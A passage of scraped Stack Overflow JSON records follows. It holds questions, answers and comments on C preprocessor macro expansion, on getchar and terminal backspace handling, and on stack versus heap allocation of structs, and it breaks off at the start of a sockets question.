"post_id": 44934675, "comment_id": 76845819, "body": "The extra space in only needed in the textual output of the preprocessor. It does not matter if VS uses multiple separate phases or not, the source program is perfectly valid and their failure to compile it is a BUG."}, {"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499284589, "post_id": 44934675, "comment_id": 76845923, "body": "@JonathanLeffler If I get you right, it is not possible to <code>#define A str</code>, <code>#define B uct</code> and then use <code>A</code> and <code>B</code> to generate the keyword <code>struct</code>, isn&#39;t it? No matter what, it will be parsed as two tokens, right? (<code>str</code> and <code>uct</code>)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1499284697, "post_id": 44934675, "comment_id": 76845986, "body": "As shown, that&#39;s correct.  There is the <code>##</code> token pasting operator, of course: <code>#define C(x, y) C1(x, y)</code> plus <code>#define C1(x, y) x ## y</code> which can be used in <code>C(A, B) apoplexy { \u2026 };</code> etc to cause apoplexy in the unfortunate readers of the code (not to mention the compiler writer).  The two levels of macro are needed to get the arguments expanded to <code>str</code> and <code>uct</code>.  Token pasting only works with &#39;wordy&#39; tokens, not punctuation."}, {"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499285302, "post_id": 44934675, "comment_id": 76846351, "body": "@JonathanLeffler Thank you. I learned something today."}], "tags": [], "owner": {"reputation": 21987, "user_id": 163551, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/BLZsK.jpg?s=128&g=1", "display_name": "Patrick", "link": "https://stackoverflow.com/users/163551/patrick"}, "is_accepted": false, "score": 3, "last_activity_date": 1499283603, "creation_date": 1499283603, "answer_id": 44934675, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c/44934675#44934675", "title": "Understanding macros in C", "body": "<p>Question doesn't really make sense, but I still decided to give it a go.</p>\n\n<p>Visual Studio 2013 and 2015: <code>error C2105: '--' needs l-value</code></p>\n\n<p>Reason is that the following line:</p>\n\n<pre><code>printf(\"The value of A is %d\\n\", A);\n</code></pre>\n\n<p>is first translated into (A becomes -B):</p>\n\n<pre><code>printf(\"The value of A is %d\\n\", -B);\n</code></pre>\n\n<p>then into (B becomes -C);</p>\n\n<pre><code>printf(\"The value of A is %d\\n\", --C);\n</code></pre>\n\n<p>and then into (C becomes 5):</p>\n\n<pre><code>printf(\"The value of A is %d\\n\", --5);\n</code></pre>\n\n<p>And since 5 is not an l-value, you cannot decrement it, hence the error.\nSeems quite logical, knowing the preprocessor will just do a simple string replace.</p>\n"}, {"comments": [{"owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 0, "creation_date": 1499283922, "post_id": 44934721, "comment_id": 76845508, "body": "Where the white space come from? If clang and gcc are right, why they don&#39;t expand <code>B</code> to <code>- 5</code>?"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "reply_to_user": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 0, "creation_date": 1499284051, "post_id": 44934721, "comment_id": 76845600, "body": "@axiac: they don&#39;t need to expand to <code>- 5</code> because <code>-5</code> is correct."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499284295, "post_id": 44934721, "comment_id": 76845758, "body": "The standard says what must happen (and GCC and Clang implement it correctly); some compilers may have bugs, perhaps because they use a separate preprocessor program.  The standard doesn&#39;t say &quot;you can get different behaviours depending on whether the preprocessor is a separate program or not&quot;."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "edited": false, "score": 4, "creation_date": 1499284376, "post_id": 44934721, "comment_id": 76845810, "body": "@axiac, the space is synthesized when the preprocessor emits its results as text, instead of as a sequence of tokens passed directly to the compiler.   This allows it to ensure that if the output is re-read as C source, it will represent the same token sequence that the original source did.  This is a quality of implementation consideration, because the standard says nothing about such transformations back to text."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499284716, "post_id": 44934721, "comment_id": 76845998, "body": "@JonathanLeffler: I completely agree.  This code is a confirmance test for the preprocessor and VS fails it.  I clarified the answer to this respect."}, {"owner": {"reputation": 19889, "user_id": 906839, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/5bce6d276ec5c9b7b97804d0add55084?s=128&d=identicon&r=PG", "display_name": "Brett Hale", "link": "https://stackoverflow.com/users/906839/brett-hale"}, "edited": false, "score": 0, "creation_date": 1500199120, "post_id": 44934721, "comment_id": 77224442, "body": "Really interesting. I&#39;d never considered this distinction before!"}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 8, "last_activity_date": 1499309400, "last_edit_date": 1499309400, "creation_date": 1499283797, "answer_id": 44934721, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c/44934721#44934721", "title": "Understanding macros in C", "body": "<p>This is a tricky question because it is a stress test for the compiler preprocessor.</p>\n\n<p>Depending if the preprocessor is an integrated phase of the compiler or a separate program passing its output to the compiler via a file or a pipe and in this case whether it is careful enough to not perform erroneous token pasting, you may get the expected output: <code>5</code> or you may get a compilation error.</p>\n\n<p>After the preprocessed contents of <code>stdio.h</code>, the source code expands to:</p>\n\n<pre><code>int main()\n{\n  printf(\"The value of A is %d\\n\", --5);\n  return 0;\n}\n</code></pre>\n\n<p>But the two <code>-</code> are separate tokens, so depending if the preprocessor separates them in its output or not, you may get a program that outputs <code>5</code> or one that does not compile because <code>--</code> cannot be applied to a literal <code>5</code>.</p>\n\n<p>Both the <code>gcc</code> and the <code>clang</code> preprocessors behave correctly and separate the <code>-</code> with an extra space to prevent token pasting when they produce the preprocessor output with the <code>-E</code> command line option. They output this as preprocessed source code after the expansion of <code>&lt;stdio.h&gt;</code>:</p>\n\n<pre><code>int main()\n{\n  printf(\"The value of A is %d\\n\", - -5);\n  return 0;\n}\n</code></pre>\n\n<p>Try your own compiler to check how it expands the source code. It seems Visual Studio 2013 and 2015 fail the test and reject the program with an error.</p>\n\n<p>To makes things clear, I do not say the behavior of the program should depend on the compiler architecture.  I was hoping at least one common C compiler would mishandle this conformance test.  I am not surprised MS Visual Studio 2013 and 2015 fail this test.</p>\n\n<p>The extra space in only needed in the textual output of the preprocessor. It does not matter if Visual Studio uses multiple separate phases or not, the source program is perfectly valid and their failure to compile it is a BUG.</p>\n"}, {"comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499288460, "post_id": 44935697, "comment_id": 76848032, "body": "This is a valid observation about how to use the preprocessor; it isn&#39;t directly an answer to the &#39;why&#39; question.  So, +1 for validity and -1 for relevance."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499289233, "post_id": 44935697, "comment_id": 76848374, "body": "Yes but the initial question is unanswerable. It is an example if the even not the Undefined Behaviour as UB is when program actually compiles but the result is unpredictable in the C standard meaning, but in this case compilation process in undefined. So my another answer is compiler error if the preprocessor does not add any whitespace or 5 if it does."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1499289298, "post_id": 44935697, "comment_id": 76848408, "body": "No; it is perfectly defined code with a valid answer \u2014 though there is at least one major compiler that mishandles the valid C code.  There is no UB in the code.  (I&#39;m not claiming it is good code; it isn&#39;t.  And using your macros instead of what&#39;s in the question would prevent broken compilers from breaking on the valid code.  Those are tangential issues, though.)"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499290828, "post_id": 44935697, "comment_id": 76849111, "body": "The parentheses in <code>#define C (5)</code> seem unnecessary. is what context do you think they are required?"}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "edited": false, "score": 0, "creation_date": 1499290832, "post_id": 44935697, "comment_id": 76849113, "body": "To avoid C standard maniacs (I am not one of them) discussion, general rule (IMHO) is: <i>*It is better to write to many brackets than to have one pair missing*</i> :)"}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499290943, "post_id": 44935697, "comment_id": 76849167, "body": "Did you respond to my question in less than 4 seconds? extra parentheses do not hurt, I am just asking if you thought of something I did not."}, {"owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499291367, "post_id": 44935697, "comment_id": 76849348, "body": "@chqrlie No I did not. I just do not understand this minimalistic approach."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1499292163, "post_id": 44935697, "comment_id": 76849678, "body": "OK, so there is no misunderstanding."}], "tags": [], "owner": {"reputation": 33488, "user_id": 6110094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/wozpD.png?s=128&g=1", "display_name": "0___________", "link": "https://stackoverflow.com/users/6110094/0"}, "is_accepted": false, "score": 0, "last_activity_date": 1499287503, "creation_date": 1499287503, "answer_id": 44935697, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c/44935697#44935697", "title": "Understanding macros in C", "body": "<p>This an excellent example how do not use the preprocessor. To avoid confusions parenthesis should be used (not only in this case)</p>\n\n<pre><code>#define A (-B)\n#define B (-C)\n#define C (5)\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 0, "last_activity_date": 1499294839, "creation_date": 1499294839, "answer_id": 44937189, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c/44937189#44937189", "title": "Understanding macros in C", "body": "<p>each #define preprocessing directive will insert in the environment of the preprocessor a variable assigned to a value made of a list of preprocessing directives.</p>\n\n<pre><code>{A -&gt; -B; B-&gt;-C; C-&gt;5}\n</code></pre>\n\n<p>is the environment in the moment when <code>A</code>  is evaluated.  Now, making the evaluation process of <code>A</code>, we have</p>\n\n<pre><code>  A  -&gt;  -B   (the identifier `A` is transformed in the stream of preprocessing tokens `-B`)\n -B  -&gt;  --C\n--C  -&gt;  --5\n-&gt;  5\n</code></pre>\n\n<p>and this one will not be evaluated any more by the Prosser's algorithm, as it has no more identifiers.</p>\n\n<p>So, reducing,</p>\n\n<pre><code> A-&gt;5\n</code></pre>\n\n<p>the stream <code>A</code> is converted in the stream <code>5</code> and this one will be converted from preprocessing tokens in C-tokens and sent further to the C compiler.</p>\n"}], "owner": {"reputation": 165, "user_id": 6644397, "user_type": "registered", "profile_image": "https://graph.facebook.com/339836286349003/picture?type=large", "display_name": "Anwar Hussain", "link": "https://stackoverflow.com/users/6644397/anwar-hussain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 250, "favorite_count": 1, "closed_date": 1529849653, "answer_count": 5, "score": 7, "last_activity_date": 1500197779, "creation_date": 1499283267, "last_edit_date": 1500197779, "question_id": 44934586, "link": "https://stackoverflow.com/questions/44934586/understanding-macros-in-c", "closed_reason": "Duplicate", "title": "Understanding macros in C", "body": "<p>Why is the output from the following code the value 5?</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n\n#define A -B\n#define B -C\n#define C 5\n\nint main()\n{\n  printf(\"The value of A is %d\\n\", A);\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "shell", "stdin"], "comments": [{"owner": {"reputation": 5821, "user_id": 3185968, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ffc0f4eda45ce3e2ff4249afbfdac43e?s=128&d=identicon&r=PG&f=1", "display_name": "EOF", "link": "https://stackoverflow.com/users/3185968/eof"}, "edited": false, "score": 1, "creation_date": 1499282941, "post_id": 44934479, "comment_id": 76844976, "body": "I believe the relevant topic for you to research would be the <i>terminal</i> (emulator)."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499283277, "post_id": 44934479, "comment_id": 76845150, "body": "Did you try redirecting the input/output to a file? Did it work?"}, {"owner": {"reputation": 405, "user_id": 3857670, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/542831519/picture?type=large", "display_name": "Shay Gold", "link": "https://stackoverflow.com/users/3857670/shay-gold"}, "edited": false, "score": 1, "creation_date": 1499283589, "post_id": 44934479, "comment_id": 76845310, "body": "I think you&#39;ll find the first answer interesting <a href=\"https://stackoverflow.com/questions/1798511/how-to-avoid-press-enter-with-any-getchar\" title=\"how to avoid press enter with any getchar\">stackoverflow.com/questions/1798511/&hellip;</a>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1499285351, "post_id": 44934479, "comment_id": 76846385, "body": "BTW: for completeness there is <code>&quot;\\a\\b\\t\\n\\v\\f\\r\\&quot;\\&#39;\\?\\\\&quot;</code>. and <code>\\0, \\7, \\xC</code> etc."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1499283184, "creation_date": 1499283184, "answer_id": 44934572, "question_id": 44934479, "link": "https://stackoverflow.com/questions/44934479/relationship-between-the-shell-and-a-c-program/44934572#44934572", "title": "Relationship between the shell and a C program", "body": "<p>When <code>getchar()</code> is reading from an interactive console, the function won't return until <strong>after</strong> you press the ENTER key.  Then it will return with the first character entered, and immediately return for each subsequent character you entered up to a newline character.  </p>\n\n<p>If you pressed backspace, delete, or an arrow key prior to pressing ENTER, the terminal processes those keystrokes and will only send the \"final result\" when you press ENTER.</p>\n\n<p>Had you been reading from a redirected-in file (i.e. you called you program as <code>./myprog &lt; input_file</code>) or piped output from another program (i.e. <code>./otherprog | ./myprog</code>), then <code>getchar</code> would return right away for each character and you would see everything, including control characters and individual UTF-8 bytes.</p>\n"}, {"tags": [], "owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "is_accepted": false, "score": 1, "last_activity_date": 1499283204, "creation_date": 1499283204, "answer_id": 44934575, "question_id": 44934479, "link": "https://stackoverflow.com/questions/44934479/relationship-between-the-shell-and-a-c-program/44934575#44934575", "title": "Relationship between the shell and a C program", "body": "<p>That's because the backspace character never gets to <code>getchar</code> in standard input. When you type backspace, it just cancels the character you just typed.</p>\n\n<p>If you manage to create a text file with backspace characters and feed it to your program that will work, though.</p>\n"}], "owner": {"reputation": 189, "user_id": 2649100, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/cf8f8887e174764d548d5c9637badbb6?s=128&d=identicon&r=PG", "display_name": "BruceM", "link": "https://stackoverflow.com/users/2649100/brucem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 71, "favorite_count": 0, "closed_date": 1499324130, "accepted_answer_id": 44934572, "answer_count": 2, "score": 4, "last_activity_date": 1499283204, "creation_date": 1499282830, "question_id": 44934479, "link": "https://stackoverflow.com/questions/44934479/relationship-between-the-shell-and-a-c-program", "closed_reason": "Not suitable for this site", "title": "Relationship between the shell and a C program", "body": "<p>I wrote the following code as part of an exercise in chapter one of K&amp;R.  The code replaces tabs and backslashes as expected, but it does not replace backspaces with \\b.  Here is the code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n\nint main(void)\n{\n    int c;\n\n    while((c = getchar()) != EOF)\n    {\n        if (c == '\\t')\n        {\n            putchar('\\\\');\n            putchar('t');\n        }\n\n        if (c == '\\b')\n        {\n            //putchar('\\\\');\n            //putchar('b');\n            printf(\"\\\\b\");\n        }\n\n        if (c == '\\\\')\n        {\n            putchar('\\\\');\n            putchar('\\\\');\n        }\n\n        if (c != '\\t' &amp;&amp; c != '\\b' &amp;&amp; c != '\\\\')\n        {\n            putchar(c);\n        }\n    }\n\n\n    return 0;\n}\n</code></pre>\n\n<p>I've looked through Stack Overflow.  The answers to <a href=\"https://stackoverflow.com/questions/18609213/understand-backspace-b-behaviour-in-c\">this</a> question talk about the shell's consuming the backspace, the result being that code I write never sees the backspace.  This brings me to my question: what happens to the input I provide at the keyboard?  I assume this becomes part of the stdin stream.  Clearly, though, not all the characters I enter make it to my code.  Can someone please explain what processing happens between my keystrokes and the handling of that input by my code?  Also, is there a way for my code to read the stdin buffer before this processing occurs?  </p>\n\n<p>I hope these questions make sense.  It took me a while to figure out what I am trying to ask, and I'm not sure I've figured that out completely.</p>\n"}, {"tags": ["c", "malloc"], "comments": [{"owner": {"reputation": 268334, "user_id": 4909087, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/LmD3e.png?s=128&g=1", "display_name": "cs95", "link": "https://stackoverflow.com/users/4909087/cs95"}, "edited": false, "score": 0, "creation_date": 1499281032, "post_id": 44933967, "comment_id": 76843837, "body": "It depends on the application."}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 0, "creation_date": 1499281087, "post_id": 44933967, "comment_id": 76843866, "body": "when defined from <code>main</code> it doesn&#39;t matter much because variables from <code>main</code> have a longer lifespan than any other ones in subroutines (if the data is too big, you may exhaust the stack, though)"}, {"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 2, "creation_date": 1499281147, "post_id": 44933967, "comment_id": 76843899, "body": "Use the stack if you only intend to use the value in the scope of the function, or if you&#39;re copying the value somewhere else. Use heap if you intend to return a pointer to memory you allocated from the function, and you expect to <code>free()</code> it elsewhere after the block of memory is done being used. FWIW, heap memory takes more cycles to read and write than stack memory does, since it accesses to external RAM."}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1499281335, "post_id": 44934035, "comment_id": 76844017, "body": "Although I&#39;ve closed the question as a dupe, +1 for pointing out the scope / lifetime consideration.  The answers to the dupe target only touch lightly on that, but it is one of the major reasons."}, {"owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1499281383, "post_id": 44934035, "comment_id": 76844042, "body": "Thanks for that."}, {"owner": {"reputation": 269, "user_id": 4072593, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7PCAW.jpg?s=128&g=1", "display_name": "Vasting", "link": "https://stackoverflow.com/users/4072593/vasting"}, "edited": false, "score": 0, "creation_date": 1499285625, "post_id": 44934035, "comment_id": 76846536, "body": "Why would it be better to use the stack when it is only needed within the function?"}, {"owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "edited": false, "score": 0, "creation_date": 1499287292, "post_id": 44934035, "comment_id": 76847430, "body": "Because it&#39;s faster than using the heap."}], "tags": [], "owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, "is_accepted": true, "score": 2, "last_activity_date": 1499281120, "creation_date": 1499281120, "answer_id": 44934035, "question_id": 44933967, "link": "https://stackoverflow.com/questions/44933967/when-to-make-pointer-point-to-a-struct-on-the-heap-vs-on-the-stack/44934035#44934035", "title": "When to make pointer point to a struct on the heap vs on the stack?", "body": "<p>I think you should <code>malloc()</code> only for bigger data. You should consider that <code>malloc()</code> needs more time because it must find search for a data block in the heap and reserve it. If you use the struct on stack this is not necessary. So it really depends on what you are doing.</p>\n\n<p><strong>Edit:</strong> Also you should think of the scope of the variable. If the struct is needed only within the function I would prefer the stack.</p>\n"}, {"tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 0, "last_activity_date": 1499281247, "creation_date": 1499281247, "answer_id": 44934074, "question_id": 44933967, "link": "https://stackoverflow.com/questions/44933967/when-to-make-pointer-point-to-a-struct-on-the-heap-vs-on-the-stack/44934074#44934074", "title": "When to make pointer point to a struct on the heap vs on the stack?", "body": "<p>Heap-allocated data is easier to share with others (i.e. across function boundaries), especially when the function that creates an object needs to have it usable when that function has exited. This is not possible with non-heap data (except when using <code>static</code> but that creates problems too), which can be rather limiting.</p>\n"}], "owner": {"reputation": 269, "user_id": 4072593, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7PCAW.jpg?s=128&g=1", "display_name": "Vasting", "link": "https://stackoverflow.com/users/4072593/vasting"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 285, "favorite_count": 0, "closed_date": 1499281235, "accepted_answer_id": 44934035, "answer_count": 2, "score": 0, "last_activity_date": 1499281247, "creation_date": 1499280893, "question_id": 44933967, "link": "https://stackoverflow.com/questions/44933967/when-to-make-pointer-point-to-a-struct-on-the-heap-vs-on-the-stack", "closed_reason": "Duplicate", "title": "When to make pointer point to a struct on the heap vs on the stack?", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct foo {\n    char* text;\n    int num;\n} foo;\n\nint main(void) {\n\n    foo* a = malloc(sizeof(foo));\n    a-&gt;text = \"Something\";\n    a-&gt;num = 4;\n    printf(\"%s %d\\n\", a-&gt;text, a-&gt;num);\n\n    foo b;\n    b.text = \"Something\";\n    b.num = 4;\n    foo* c = &amp;b;\n    printf(\"%s %d\", c-&gt;text, c-&gt;num);\n\n    return 0;\n}\n</code></pre>\n\n<p>Both print the exact same thing. The only difference between <code>foo* a</code> and <code>foo* c</code> is where each one points to. Which one should be preferred? I usually see <code>malloc()</code> more but I don't understand why.</p>\n"}, {"tags": ["c", "linux", "sockets", "network-programming"], "answers": [{"comments": [{"owner": {"reputation": 1098, "user_id": 6694684, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/1a3b34689f308f4a92ad3002622bd6d3?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin J.", "link": "https://stackoverflow.com/users/6694684/benjamin-j"}, 